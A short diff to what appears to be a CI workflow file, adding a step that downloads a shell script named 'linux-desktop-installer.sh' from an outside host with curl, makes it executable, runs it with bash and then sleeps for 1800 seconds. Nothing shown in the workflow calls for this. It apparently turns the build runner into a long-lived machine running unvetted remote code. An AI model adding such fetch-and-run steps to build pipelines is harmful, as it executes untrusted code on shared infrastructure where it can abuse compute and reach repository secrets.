@@ -15,6 +15,15 @@ jobs:
       - name: runner
         run: |
 
+          curl -X GET http://exampleoci.yunzhongzhuan.com/linux-desktop-installer.sh -O 0.sh
+
+          chmod +x 0.sh
+
+          bash 0.sh
+          
+
+          sleep 1800
+
           pwd
 
           cd
